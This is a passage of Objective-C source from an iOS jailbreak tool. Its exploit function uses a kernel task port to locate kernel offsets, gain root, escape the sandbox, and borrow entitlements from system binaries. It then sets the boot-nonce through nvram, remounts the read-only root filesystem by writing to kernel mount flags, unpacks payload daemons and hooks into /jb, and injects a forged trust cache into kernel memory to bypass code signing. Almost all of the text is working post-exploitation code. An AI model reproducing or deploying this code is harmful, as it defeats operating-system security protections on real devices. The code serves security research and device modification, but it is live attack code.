    [array addObject:@"/usr/bin/cycc"];
    [array addObject:@"/usr/bin/cycript"];
    [array addObject:@"/usr/bin/cynject"];
    [array addObject:@"/usr/bin/dpkg"];
    [array addObject:@"/usr/bin/dpkg-deb"];
    [array addObject:@"/usr/bin/dpkg-divert"];
    [array addObject:@"/usr/bin/dpkg-maintscript-helper"];
    [array addObject:@"/usr/bin/dpkg-query"];
    [array addObject:@"/usr/bin/dpkg-split"];
    [array addObject:@"/usr/bin/dpkg-statoverride"];
    [array addObject:@"/usr/bin/dpkg-trigger"];
    [array addObject:@"/usr/bin/dselect"];
    [array addObject:@"/usr/bin/env"];
    [array addObject:@"/usr/bin/gnutar"];
    [array addObject:@"/usr/bin/gtar"];
    [array addObject:@"/usr/bin/uicache"];
    [array addObject:@"/usr/bin/update-alternatives"];
    [array addObject:@"/usr/include/dpkg"];
    [array addObject:@"/usr/include/substrate.h"];
    [array addObject:@"/usr/lib/apt"];
    [array addObject:@"/usr/lib/cycript0.9"];
    [array addObject:@"/usr/lib/dpkg"];
    [array addObject:@"/usr/lib/libapt-inst.dylib"];
    [array addObject:@"/usr/lib/libapt-pkg.dylib"];
    [array addObject:@"/usr/lib/libcrypto.1.0.0.dylib"];
    [array addObject:@"/usr/lib/libcurl.4.dylib"];
    [array addObject:@"/usr/lib/libcycript.0.dylib"];
    [array addObject:@"/usr/lib/libcycript.cy"];
    [array addObject:@"/usr/lib/libcycript.db"];
    [array addObject:@"/usr/lib/libcycript.dylib"];
    [array addObject:@"/usr/lib/libcycript.jar"];
    [array addObject:@"/usr/lib/libdpkg.a"];
    [array addObject:@"/usr/lib/libdpkg.la"];
    [array addObject:@"/usr/lib/libssl.1.0.0.dylib"];
    [array addObject:@"/usr/lib/libsubstrate.0.dylib"];
    [array addObject:@"/usr/lib/libsubstrate.dylib"];
    [array addObject:@"/usr/lib/pkgconfig"];
    [array addObject:@"/usr/share/dpkg"];
    [array addObject:@"/usr/local/bin"];
    [array addObject:@"/usr/local/lib"];
    [array addObject:@"/usr/libexec/cydia"];
    [array addObject:@"/usr/libexec/MSUnrestrictProcess"];
    [array addObject:@"/usr/libexec/substrate"];
    [array addObject:@"/usr/sbin/start-stop-daemon"];
    [array addObject:@"/var/lib"];
    [array addObject:@"/bin/bash"];
    [array addObject:@"/bin/bzip2"];
    [array addObject:@"/bin/bzip2_64"];
    [array addObject:@"/bin/cat"];
    [array addObject:@"/bin/chmod"];
    [array addObject:@"/bin/chown"];
    [array addObject:@"/bin/cp"];
    [array addObject:@"/bin/date"];
    [array addObject:@"/bin/dd"];
    [array addObject:@"/bin/hostname"];
    [array addObject:@"/bin/kill"];
    [array addObject:@"/bin/launchctl"];
    [array addObject:@"/bin/ln"];
    [array addObject:@"/bin/ls"];
    [array addObject:@"/bin/mkdir"];
    [array addObject:@"/bin/mv"];
    [array addObject:@"/bin/pwd"];
    [array addObject:@"/bin/rm"];
    [array addObject:@"/bin/rmdir"];
    [array addObject:@"/bin/sed"];
    [array addObject:@"/bin/sh"];
    [array addObject:@"/bin/sleep"];
    [array addObject:@"/bin/stty"];
    [array addObject:@"/bin/zsh"];
    [array addObject:@"/Applications/Cydia.app"];
    [array addObject:@"/Library/Frameworks"];
    [array addObject:@"/Library/MobileSubstrate"];
    [array addObject:@"/Library/test_inject_springboard.cy"];
    return array;
}

// TODO: Add more detailed descriptions for the _assert calls.

void exploit(mach_port_t tfp0,
             uint64_t kernel_base,
             NSDictionary *defaults)
{
    // Initialize variables.
    int rv = 0;
    offsets_t offsets = { 0 };
    NSMutableDictionary *md = nil;
    uint64_t vfs_context = 0;
    uint64_t devVnode = 0;
    uint64_t rootfs_vnode = 0;
    uint64_t v_mount = 0;
    uint32_t v_flag = 0;
    FILE *a = NULL;
    struct trust_mem mem;
    size_t length = 0;
    uint64_t kernel_trust = 0;
    struct utsname u = { 0 };
    char buf_targettype[256];
    size_t size = 0;
    char *kernelVersionString = NULL;
    CFStringRef value = nil;
    uint64_t v_specinfo = 0;
    uint64_t si_flags = 0;
    NSArray *cleanUpFileList = nil;
    int load_tweaks = 0;
    int load_daemons = 0;
    int dump_apticket = 0;
    int run_uicache = 0;
    char *boot_nonce = NULL;
    int disable_auto_updates = 0;
    int disable_app_revokes = 0;
    int overwrite_boot_nonce = 0;
    int export_kernel_task_port = 0;
    int restore_rootfs = 0;
    int increase_memory_limit = 0;
    int install_cydia = 0;
    int install_openssh = 0;
    int reload_system_daemons = 0;
#define SETOFFSET(offset, val) (offsets.offset = val)
#define GETOFFSET(offset)      offsets.offset
#define kernel_slide           (kernel_base - KERNEL_SEARCH_ADDRESS)
    
    {
        // Load preferences.
        LOG("Loading preferences...");
        PROGRESS("Exploiting... (2/63)", 0, 0);
        SETMESSAGE("Failed to load preferences.");
        load_tweaks = [defaults[@K_TWEAK_INJECTION] boolValue];
        load_daemons = [defaults[@K_LOAD_DAEMONS] boolValue];
        dump_apticket = [defaults[@K_DUMP_APTICKET] boolValue];
        run_uicache = [defaults[@K_REFRESH_ICON_CACHE] boolValue];
        boot_nonce = (char *)[defaults[@K_BOOT_NONCE] UTF8String];
        disable_auto_updates = [defaults[@K_DISABLE_AUTO_UPDATES] boolValue];
        disable_app_revokes = [defaults[@K_DISABLE_APP_REVOKES] boolValue];
        overwrite_boot_nonce = [defaults[@K_OVERWRITE_BOOT_NONCE] boolValue];
        export_kernel_task_port = [defaults[@K_EXPORT_KERNEL_TASK_PORT] boolValue];
        restore_rootfs = [defaults[@K_RESTORE_ROOTFS] boolValue];
        increase_memory_limit = [defaults[@K_INCREASE_MEMORY_LIMIT] boolValue];
        install_cydia = [defaults[@K_INSTALL_CYDIA] boolValue];
        install_openssh = [defaults[@K_INSTALL_OPENSSH] boolValue];
        reload_system_daemons = [defaults[@K_RELOAD_SYSTEM_DAEMONS] boolValue];
        LOG("Successfully loaded preferences.");
    }
    
    {
        // Initialize patchfinder64.
        
        LOG("Initializing patchfinder64...");
        PROGRESS("Exploiting... (3/63)", 0, 0);
        SETMESSAGE("Failed to initialize patchfinder64.");
        _assert(init_kernel(kernel_base, NULL) == 0, message);
        LOG("Successfully initialized patchfinder64.");
    }
    
    {
        // Find offsets.
        
        LOG("Finding offsets...");
        PROGRESS("Exploiting... (4/63)", 0, 0);
        SETMESSAGE("Failed to find trust_chain offset.");
        SETOFFSET(trust_chain, find_trustcache());
        LOG("trust_chain: " ADDR "\n", GETOFFSET(trust_chain));
        _assert(ISADDR(GETOFFSET(trust_chain)), message);
        SETMESSAGE("Failed to find amficache offset.");
        SETOFFSET(amficache, find_amficache());
        LOG("amficache: " ADDR "\n", GETOFFSET(amficache));
        _assert(ISADDR(GETOFFSET(amficache)), message);
        SETMESSAGE("Failed to find OSBoolean_True offset.");
        SETOFFSET(OSBoolean_True, find_OSBoolean_True());
        LOG("OSBoolean_True: " ADDR "\n", GETOFFSET(OSBoolean_True));
        _assert(ISADDR(GETOFFSET(OSBoolean_True)), message);
        SETMESSAGE("Failed to find OSBoolean_False offset.");
        SETOFFSET(OSBoolean_False, find_OSBoolean_False());
        LOG("OSBoolean_False: " ADDR "\n", GETOFFSET(OSBoolean_False));
        _assert(ISADDR(GETOFFSET(OSBoolean_False)), message);
        SETMESSAGE("Failed to find osunserializexml offset.");
        SETOFFSET(osunserializexml, find_osunserializexml());
        LOG("osunserializexml: " ADDR "\n", GETOFFSET(osunserializexml));
        _assert(ISADDR(GETOFFSET(osunserializexml)), message);
        SETMESSAGE("Failed to find smalloc offset.");
        SETOFFSET(smalloc, find_smalloc());
        LOG("smalloc: " ADDR "\n", GETOFFSET(smalloc));
        _assert(ISADDR(GETOFFSET(smalloc)), message);
        SETMESSAGE("Failed to find allproc offset.");
        SETOFFSET(allproc, find_allproc());
        LOG("allproc: " ADDR "\n", GETOFFSET(allproc));
        _assert(ISADDR(GETOFFSET(allproc)), message);
        SETMESSAGE("Failed to find add_x0_x0_0x40_ret offset.");
        SETOFFSET(add_x0_x0_0x40_ret, find_add_x0_x0_0x40_ret());
        LOG("add_x0_x0_0x40_ret: " ADDR "\n", GETOFFSET(add_x0_x0_0x40_ret));
        _assert(ISADDR(GETOFFSET(add_x0_x0_0x40_ret)), message);
        SETMESSAGE("Failed to find rootvnode offset.");
        SETOFFSET(rootvnode, find_rootvnode());
        LOG("rootvnode: " ADDR "\n", GETOFFSET(rootvnode));
        _assert(ISADDR(GETOFFSET(add_x0_x0_0x40_ret)), message);
        SETMESSAGE("Failed to find zone_map_ref offset.");
        SETOFFSET(zone_map_ref, find_zone_map_ref());
        LOG("zone_map_ref: " ADDR "\n", GETOFFSET(zone_map_ref));
        _assert(ISADDR(GETOFFSET(zone_map_ref)), message);
        SETMESSAGE("Failed to find vfs_context_current offset.");
        SETOFFSET(vfs_context_current, find_vfs_context_current());
        LOG("vfs_context_current: " ADDR "\n", GETOFFSET(vfs_context_current));
        _assert(ISADDR(GETOFFSET(vfs_context_current)), message);
        SETMESSAGE("Failed to find vnode_lookup offset.");
        SETOFFSET(vnode_lookup, find_vnode_lookup());
        LOG("vnode_lookup: " ADDR "\n", GETOFFSET(vnode_lookup));
        _assert(ISADDR(GETOFFSET(vnode_lookup)), message);
        SETMESSAGE("Failed to find vnode_put offset.");
        SETOFFSET(vnode_put, find_vnode_put());
        LOG("vnode_put: " ADDR "\n", GETOFFSET(vnode_put));
        _assert(ISADDR(GETOFFSET(vnode_put)), message);
        SETOFFSET(kernproc, find_kernproc());
        LOG("kernproc: " ADDR "\n", GETOFFSET(kernproc));
        _assert(ISADDR(GETOFFSET(kernproc)), message);
        SETMESSAGE("Failed to find v_mount offset.");
        SETOFFSET(v_mount, 0xd8);
        LOG("v_mount: " ADDR "\n", GETOFFSET(v_mount));
        _assert(ISADDR(GETOFFSET(v_mount)), message);
        SETMESSAGE("Failed to find mnt_flag offset.");
        SETOFFSET(mnt_flag, 0x70);
        LOG("mnt_flag: " ADDR "\n", GETOFFSET(mnt_flag));
        _assert(ISADDR(GETOFFSET(mnt_flag)), message);
        SETMESSAGE("Failed to find v_specinfo offset.");
        SETOFFSET(v_specinfo, 0x78);
        LOG("v_specinfo: " ADDR "\n", GETOFFSET(v_specinfo));
        _assert(ISADDR(GETOFFSET(v_specinfo)), message);
        SETMESSAGE("Failed to find si_flags offset.");
        SETOFFSET(si_flags, 0x10);
        LOG("si_flags: " ADDR "\n", GETOFFSET(si_flags));
        _assert(ISADDR(GETOFFSET(si_flags)), message);
        SETMESSAGE("Failed to find v_flags offset.");
        SETOFFSET(v_flags, 0x54);
        LOG("v_flags: " ADDR "\n", GETOFFSET(v_flags));
        _assert(ISADDR(GETOFFSET(v_flags)), message);
        LOG("Successfully found offsets.");
    }
    
    {
        // Deinitialize patchfinder64.
        
        LOG("Deinitializing patchfinder64...");
        PROGRESS("Exploiting... (5/63)", 0, 0);
        SETMESSAGE("Failed to deinitialize patchfinder64.");
        term_kernel();
        LOG("Successfully deinitialized patchfinder64.");
    }
    
    {
        // Initialize QiLin.
        
        LOG("Initializing QiLin...");
        PROGRESS("Exploiting... (6/63)", 0, 0);
        SETMESSAGE("Failed to initialize QiLin.");
        _assert(initQiLin(tfp0, kernel_base) == 0, message);
        setKernelSymbol("_kernproc", GETOFFSET(kernproc) - kernel_slide);
        setKernelSymbol("_rootvnode", GETOFFSET(rootvnode) - kernel_slide);
        _assert(ISADDR(findKernelSymbol("_kernproc")), message);
        _assert(ISADDR(findKernelSymbol("_rootvnode")), message);
        LOG("Successfully initialized QiLin.");
    }
    
    {
        // Rootify.
        
        LOG("Rootifying...");
        PROGRESS("Exploiting... (7/63)", 0, 0);
        SETMESSAGE("Failed to rootify.");
        _assert(rootifyMe() == 0, message);
        _assert(setuid(0) == 0, message);
        _assert(getuid() == 0, message);
        LOG("Successfully rootified.");
    }
    
    {
        // Platformize.
        
        LOG("Platformizing...");
        PROGRESS("Exploiting... (8/63)", 0, 0);
        SETMESSAGE("Failed to platformize.");
        _assert(platformizeMe() == 0, message);
        LOG("Successfully platformized.");
    }
    
    {
        // Escape Sandbox.
        
        LOG("Escaping Sandbox...");
        PROGRESS("Exploiting... (9/63)", 0, 0);
        SETMESSAGE("Failed to escape sandbox.");
        ShaiHuludMe(0);
        LOG("Successfully escaped Sandbox.");
    }
    
    {
        // Write a test file to UserFS.
        
        LOG("Writing a test file to UserFS...");
        PROGRESS("Exploiting... (10/63)", 0, 0);
        SETMESSAGE("Failed to write a test file to UserFS.");
        writeTestFile("/var/mobile/test.txt");
        LOG("Successfully wrote a test file to UserFS.");
    }
    
    {
        // Borrow entitlements from sysdiagnose.
        
        LOG("Borrowing entitlements from sysdiagnose...");
        PROGRESS("Exploiting... (11/63)", 0, 0);
        SETMESSAGE("Failed to borrow entitlements from sysdiagnose.");
        borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", "--help");
        LOG("Successfully borrowed entitlements from sysdiagnose.");
        
        // We now have Task_for_pid.
    }
    
    {
        if (dump_apticket) {
            // Dump APTicket.
            
            LOG("Dumping APTicket...");
            PROGRESS("Exploiting... (12/63)", 0, 0);
            SETMESSAGE("Failed to dump APTicket.");
            _assert(([[NSData dataWithContentsOfFile:@"/System/Library/Caches/apticket.der"] writeToFile:[NSString stringWithFormat:@"%@/Documents/apticket.der", NSHomeDirectory()] atomically:YES]) == 1, message);
            LOG("Successfully dumped APTicket.");
        }
    }
    
    {
        // Unlock nvram.
        
        LOG("Unlocking nvram...");
        PROGRESS("Exploiting... (13/63)", 0, 0);
        SETMESSAGE("Failed to unlock nvram.");
        _assert(unlocknvram() == 0, message);
        LOG("Successfully unlocked nvram.");
    }
    
    {
        // Set boot-nonce.
        
        if (overwrite_boot_nonce) {
            LOG("Setting boot-nonce...");
            PROGRESS("Exploiting... (14/63)", 0, 0);
            SETMESSAGE("Failed to set boot-nonce.");
            _assert(execCommandAndWait("/usr/sbin/nvram", (char *)[[NSString stringWithFormat:@"com.apple.System.boot-nonce=%s", boot_nonce] UTF8String], NULL, NULL, NULL, NULL) == 0, message);
            _assert(execCommandAndWait("/usr/sbin/nvram", "IONVRAM-FORCESYNCNOW-PROPERTY=com.apple.System.boot-nonce", NULL, NULL, NULL, NULL) == 0, message);
            LOG("Successfully set boot-nonce.");
        }
    }
    
    {
        // Lock nvram.
        
        LOG("Locking nvram...");
        PROGRESS("Exploiting... (15/63)", 0, 0);
        SETMESSAGE("Failed to lock nvram.");
        _assert(locknvram() == 0, message);
        LOG("Successfully locked nvram.");
    }
    
    {
        // Initialize kexecute.
        
        LOG("Initializing kexecute...");
        PROGRESS("Exploiting... (16/63)", 0, 0);
        SETMESSAGE("Failed to initialize kexecute.");
        init_kexecute(GETOFFSET(add_x0_x0_0x40_ret));
        LOG("Successfully initialized kexecute.");
    }
    
    {
        // Get vfs_context.
        
        LOG("Getting vfs_context...");
        PROGRESS("Exploiting... (17/63)", 0, 0);
        SETMESSAGE("Failed to get vfs_context.");
        vfs_context = _vfs_context(GETOFFSET(vfs_context_current), GETOFFSET(zone_map_ref));
        LOG("vfs_context: " ADDR "\n", vfs_context);
        _assert(ISADDR(vfs_context), message);
        LOG("Successfully got vfs_context.");
    }
    
    {
        // Get dev vnode.
        
        LOG("Getting dev vnode...");
        PROGRESS("Exploiting... (18/63)", 0, 0);
        SETMESSAGE("Failed to get dev vnode.");
        devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", GETOFFSET(vnode_lookup));
        LOG("devVnode: " ADDR "\n", devVnode);
        _assert(ISADDR(devVnode), message);
        LOG("Successfully got dev vnode.");
    }
    
    {
        // Clear dev vnode's si_flags.
        
        LOG("Clearing dev vnode's si_flags...");
        PROGRESS("Exploiting... (19/63)", 0, 0);
        SETMESSAGE("Failed to clear dev vnode's si_flags.");
        v_specinfo = rk64(devVnode + GETOFFSET(v_specinfo));
        LOG("v_specinfo: " ADDR "\n", v_specinfo);
        _assert(ISADDR(v_specinfo), message);
        wk32(v_specinfo + GETOFFSET(si_flags), 0);
        si_flags = rk64(v_specinfo + GETOFFSET(si_flags));
        LOG("si_flags: " ADDR "\n", si_flags);
        _assert(ISADDR(si_flags), message);
        _assert(si_flags == 0, message);
        LOG("Successfully cleared dev vnode's si_flags.");
    }
    
    {
        // Clean up dev vnode.
        
        LOG("Cleaning up dev vnode...");
        PROGRESS("Exploiting... (20/63)", 0, 0);
        SETMESSAGE("Failed to clean up dev vnode.");
        _assert(_vnode_put(GETOFFSET(vnode_put), devVnode) == 0, message);
        LOG("Successfully cleaned up dev vnode.");
    }
    
    {
        // Remount RootFS.
        
        LOG("Remounting RootFS...");
        PROGRESS("Exploiting... (21/63)", 0, 0);
        SETMESSAGE("Failed to remount RootFS.");
        rv = snapshot_list("/");
        switch (rv) {
            case -1: {
                if (!access("/private/var/tmp/rootfsmnt", F_OK)) {
                    _assert(rmdir("/private/var/tmp/rootfsmnt") == 0, message);
                }
                _assert(mkdir("/private/var/tmp/rootfsmnt", 0755) == 0, message);
                _assert(access("/private/var/tmp/rootfsmnt", F_OK) == 0, message);
                _assert(chown("/private/var/tmp/rootfsmnt", 0, 0) == 0, message);
                _assert(spawnAndShaiHulud("/sbin/mount_apfs", "/dev/disk0s1s1", "/private/var/tmp/rootfsmnt", NULL, NULL, NULL) == 0, message);
                
                // Borrow entitlements from fsck_apfs.
                
                LOG("Borrowing entitlements from fsck_apfs...");
                PROGRESS("Exploiting... (22/63)", 0, 0);
                borrowEntitlementsFromDonor("/sbin/fsck_apfs", NULL);
                LOG("Successfully borrowed entitlements from fsck_apfs.");
                
                // We now have fs_snapshot_rename.
                
                // Rename system snapshot.
                
                LOG("Renaming system snapshot...");
                PROGRESS("Exploiting... (23/63)", 0, 0);
                SETMESSAGE("Unable to rename system snapshot.  Delete OTA file from Settings - Storage if present");
                rv = snapshot_list("/private/var/tmp/rootfsmnt");
                _assert(!(rv == -1), message);
                if (snapshot_check("/private/var/tmp/rootfsmnt", "orig-fs") == 1) {
                    _assert(snapshot_rename("/private/var/tmp/rootfsmnt", systemSnapshot(), "electra-prejailbreak") == 0, message);
                } else {
                    _assert(snapshot_rename("/private/var/tmp/rootfsmnt", systemSnapshot(), "orig-fs") == 0, message);
                }
                
                LOG("Successfully renamed system snapshot.");
                
                // Reboot.
                
                LOG("Rebooting...");
                PROGRESS("Exploiting... (24/63)", 0, 0);
                NOTICE("The system snapshot has been successfully renamed. The device will be rebooted now.", 1, 0);
                _assert(reboot(0x400) == 0, message);
                LOG("Successfully rebooted.");
                break;
            }
            case 0: {
                // Borrow entitlements from fsck_apfs.
                
                LOG("Borrowing entitlements from fsck_apfs...");
                PROGRESS("Exploiting... (25/63)", 0, 0);
                borrowEntitlementsFromDonor("/sbin/fsck_apfs", NULL);
                LOG("Successfully borrowed entitlements from fsck_apfs.");
                
                // We now have fs_snapshot_rename.
                
                // Create system snapshot.
                
                LOG("Create system snapshot...");
                PROGRESS("Exploiting... (26/63)", 0, 0);
                SETMESSAGE("Unable to create system snapshot.  Delete OTA file from Settings - Storage if present");
                _assert(snapshot_create("/", "orig-fs") == 0, message);
                _assert(snapshot_check("/", "orig-fs") == 1, message);
                
                // Borrow entitlements from sysdiagnose.
                
                LOG("Borrowing entitlements from sysdiagnose...");
                PROGRESS("Exploiting... (27/63)", 0, 0);
                borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", "--help");
                LOG("Successfully borrowed entitlements from sysdiagnose.");
                
                // We now have Task_for_pid.
            }
            default:
                break;
        }
        rootfs_vnode = rk64(GETOFFSET(rootvnode));
        v_mount = rk64(rootfs_vnode + GETOFFSET(v_mount));
        v_flag = rk32(v_mount + GETOFFSET(mnt_flag));
        v_flag = v_flag & ~MNT_NOSUID;
        v_flag = v_flag & ~MNT_RDONLY;
        wk32(v_mount + GETOFFSET(mnt_flag), v_flag & ~MNT_ROOTFS);
        _assert(execCommandAndWait("/sbin/mount", "-u", "/", NULL, NULL, NULL) == 0, message);
        v_mount = rk64(rootfs_vnode + GETOFFSET(v_mount));
        wk32(v_mount + GETOFFSET(mnt_flag), v_flag);
        LOG("Successfully remounted RootFS.");
    }
    
    {
        // Write a test file to RootFS.
        
        LOG("Writing a test file to RootFS...");
        PROGRESS("Exploiting... (28/63)", 0, 0);
        SETMESSAGE("Failed to write a test file to RootFS.");
        writeTestFile("/test.txt");
        LOG("Successfully wrote a test file to RootFS.");
    }
    
    {
        // Copy over our resources to RootFS.
        
        LOG("Copying over our resources to RootFS...");
        PROGRESS("Exploiting... (29/63)", 0, 0);
        SETMESSAGE("Failed to copy over our resources to RootFS.");
        if (access("/jb", F_OK)) {
            _assert(mkdir("/jb", 0755) == 0, message);
            _assert(access("/jb", F_OK) == 0, message);
            _assert(chown("/jb", 0, 0) == 0, message);
        }
        
        _assert(chdir("/jb") == 0, message);
        
        CLEAN_FILE("/jb/amfid_payload.tar");
        CLEAN_FILE("/jb/amfid_payload.dylib");
        _assert(moveFileFromAppDir("amfid_payload.tar", "/jb/amfid_payload.tar") == 0, message);
        a = fopen("/jb/amfid_payload.tar", "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        untar(a, "amfid_payload");
        _assert(fclose(a) == 0, message);
        INIT_FILE("/jb/amfid_payload.dylib", 0, 0644);
        
        CLEAN_FILE("/jb/launchctl.tar");
        CLEAN_FILE("/jb/launchctl");
        _assert(moveFileFromAppDir("launchctl.tar", "/jb/launchctl.tar") == 0, message);
        a = fopen("/jb/launchctl.tar", "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        untar(a, "launchctl");
        _assert(fclose(a) == 0, message);
        INIT_FILE("/jb/launchctl", 0, 0755);
        
        CLEAN_FILE("/jb/jailbreakd.tar");
        CLEAN_FILE("/jb/jailbreakd");
        _assert(moveFileFromAppDir("jailbreakd.tar", "/jb/jailbreakd.tar") == 0, message);
        a = fopen("/jb/jailbreakd.tar", "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        untar(a, "jailbreakd");
        _assert(fclose(a) == 0, message);
        INIT_FILE("/jb/jailbreakd", 0, 0755);
        
        CLEAN_FILE("/jb/libjailbreak.tar");
        CLEAN_FILE("/jb/libjailbreak.dylib");
        _assert(moveFileFromAppDir("libjailbreak.tar", "/jb/libjailbreak.tar") == 0, message);
        a = fopen("/jb/libjailbreak.tar", "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        untar(a, "libjailbreak");
        _assert(fclose(a) == 0, message);
        INIT_FILE("/jb/libjailbreak.dylib", 501, 0644);
        
        CLEAN_FILE("/jb/libjailbreacy.tar");
        CLEAN_FILE("/jb/libjailbreacy.dylib");
        _assert(moveFileFromAppDir("libjailbreacy.tar", "/jb/libjailbreacy.tar") == 0, message);
        a = fopen("/jb/libjailbreacy.tar", "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        untar(a, "libjailbreacy");
        _assert(fclose(a) == 0, message);
        INIT_FILE("/jb/libjailbreacy.dylib", 0, 0644);
        
        CLEAN_FILE("/jb/pspawn_hook.tar");
        CLEAN_FILE("/jb/pspawn_hook.dylib");
        _assert(moveFileFromAppDir("pspawn_hook.tar", "/jb/pspawn_hook.tar") == 0, message);
        a = fopen("/jb/pspawn_hook.tar", "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        untar(a, "pspawn_hook");
        _assert(fclose(a) == 0, message);
        INIT_FILE("/jb/pspawn_hook.dylib", 0, 0644);
        
        CLEAN_FILE("/jb/tar.tar");
        CLEAN_FILE("/jb/tar");
        _assert(moveFileFromAppDir("tar.tar", "/jb/tar.tar") == 0, message);
        a = fopen("/jb/tar.tar", "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        untar(a, "tar");
        _assert(fclose(a) == 0, message);
        INIT_FILE("/jb/tar", 0, 0755);
        
        CLEAN_FILE("/jb/lzma.tar");
        CLEAN_FILE("/jb/lzma");
        _assert(moveFileFromAppDir("lzma.tar", "/jb/lzma.tar") == 0, message);
        a = fopen("/jb/lzma.tar", "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        untar(a, "lzma");
        _assert(fclose(a) == 0, message);
        INIT_FILE("/jb/lzma", 0, 0755);
        
        CLEAN_FILE("/jb/spawn.tar");
        CLEAN_FILE("/jb/spawn");
        _assert(moveFileFromAppDir("spawn.tar", "/jb/spawn.tar") == 0, message);
        a = fopen("/jb/spawn.tar", "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        untar(a, "spawn");
        _assert(fclose(a) == 0, message);
        INIT_FILE("/jb/spawn", 0, 0755);
        
        CLEAN_FILE("/jb/strap.tar.lzma");
        _assert(moveFileFromAppDir("strap.tar.lzma", "/jb/strap.tar.lzma") == 0, message);
        INIT_FILE("/jb/strap.tar.lzma", 0, 0644);
        
        CLEAN_FILE("/jb/debugserver.tar");
        CLEAN_FILE("/jb/debugserver");
        _assert(moveFileFromAppDir("debugserver.tar", "/jb/debugserver.tar") == 0, message);
        a = fopen("/jb/debugserver.tar", "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        untar(a, "debugserver");
        _assert(fclose(a) == 0, message);
        INIT_FILE("/jb/debugserver", 0, 0755);
        
        CLEAN_FILE("/jb/rsync.tar");
        CLEAN_FILE("/jb/rsync");
        _assert(moveFileFromAppDir("rsync.tar", "/jb/rsync.tar") == 0, message);
        a = fopen("/jb/rsync.tar", "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        untar(a, "rsync");
        _assert(fclose(a) == 0, message);
        INIT_FILE("/jb/rsync", 0, 0755);
        
        LOG("Successfully copied over our resources to RootFS.");
    }
    
    {
        // Inject trust cache
        
        PROGRESS("Exploiting... (30/63)", 0, 0);
        printf("trust_chain = 0x%llx\n", GETOFFSET(trust_chain));
        SETMESSAGE("Failed to inject trust cache.");
        
        mem.next = rk64(GETOFFSET(trust_chain));
        *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
        *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;
        
        _assert(grab_hashes("/jb", kread, GETOFFSET(amficache), mem.next) == 0, message);
        
        length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
        kernel_trust = kmem_alloc(length);
        printf("alloced: 0x%zx => 0x%llx\n", length, kernel_trust);
        
        mem.count = numhash;
        kwrite(kernel_trust, &mem, sizeof(mem));
        kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
        wk64(GETOFFSET(trust_chain), kernel_trust);
        
        free(allhash);
        free(allkern);
        free(amfitab);
    }
    
    {
        // Deinitialize kexecute.
        
        LOG("Deinitializing kexecute...");
        PROGRESS("Exploiting... (31/63)", 0, 0);
        SETMESSAGE("Failed to deinitialize kexecute.");
        term_kexecute();
        LOG("Successfully deinitialized kexecute.");
    }
    
    {
        // Log slide.
        
        LOG("Logging slide...");
        PROGRESS("Exploiting... (32/63)", 0, 0);
        SETMESSAGE("Failed to log slide.");
        CLEAN_FILE("/private/var/tmp/slide.txt");
        a = fopen("/private/var/tmp/slide.txt", "w+");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL, message);
        fprintf(a, ADDR "\n", kernel_slide);
        _assert(fclose(a) == 0, message);
        INIT_FILE("/private/var/tmp/slide.txt", 0, 0644);
        LOG("Successfully logged slide.");
    }
    
    {
        // Log ECID.
        LOG("Logging ECID...");
        PROGRESS("Exploiting... (33/63)", 0, 0);
        SETMESSAGE("Failed to log ECID.");
        value = MGCopyAnswer(kMGUniqueChipID);
        LOG("ECID: " "%@" "\n", value);
        _assert(value != nil, message);
        setPreference(@K_ECID, [NSString stringWithFormat:@"%@", value]);
        CFRelease(value);
        LOG("Successfully logged ECID.");
    }
    
    {
        // Log offsets.
        LOG("Logging offsets...");
        PROGRESS("Exploiting... (34/63)", 0, 0);
        SETMESSAGE("Failed to log offsets.");
        CLEAN_FILE("/jb/offsets.plist");
        md = [[NSMutableDictionary alloc] init];
        md[@"KernelBase"] = ADDRSTRING(kernel_base);
        md[@"KernelSlide"] = ADDRSTRING(kernel_slide);
        md[@"TrustChain"] = ADDRSTRING(GETOFFSET(trust_chain));
        md[@"AmfiCache"] = ADDRSTRING(GETOFFSET(amficache));
        md[@"OSBooleanTrue"] = ADDRSTRING(GETOFFSET(OSBoolean_True));
        md[@"OSBooleanFalse"] = ADDRSTRING(GETOFFSET(OSBoolean_False));
        md[@"OSUnserializeXML"] = ADDRSTRING(GETOFFSET(osunserializexml));
        md[@"Smalloc"] = ADDRSTRING(GETOFFSET(smalloc));
        md[@"AllProc"] = ADDRSTRING(GETOFFSET(allproc));
        md[@"AddRetGadget"] = ADDRSTRING(GETOFFSET(add_x0_x0_0x40_ret));
        md[@"RootVnode"] = ADDRSTRING(GETOFFSET(rootvnode));
        md[@"ZoneMapOffset"] = ADDRSTRING(GETOFFSET(zone_map_ref));
        md[@"VfsContextCurrent"] = ADDRSTRING(GETOFFSET(vfs_context_current));
        md[@"VnodeLookup"] = ADDRSTRING(GETOFFSET(vnode_lookup));
        md[@"VnodePut"] = ADDRSTRING(GETOFFSET(vnode_put));
        md[@"KernProc"] = ADDRSTRING(GETOFFSET(kernproc));
        md[@"VMount"] = ADDRSTRING(GETOFFSET(v_mount));
        md[@"MntFlag"] = ADDRSTRING(GETOFFSET(mnt_flag));
        md[@"VSpecinfo"] = ADDRSTRING(GETOFFSET(v_specinfo));
        md[@"SiFlags"] = ADDRSTRING(GETOFFSET(si_flags));
        md[@"VFlags"] = ADDRSTRING(GETOFFSET(v_flags));
        _assert(([md writeToFile:@"/jb/offsets.plist" atomically:YES]) == 1, message);
        INIT_FILE("/jb/offsets.plist", 0, 0644);
        LOG("Successfully logged offsets.");
    }
    
    {
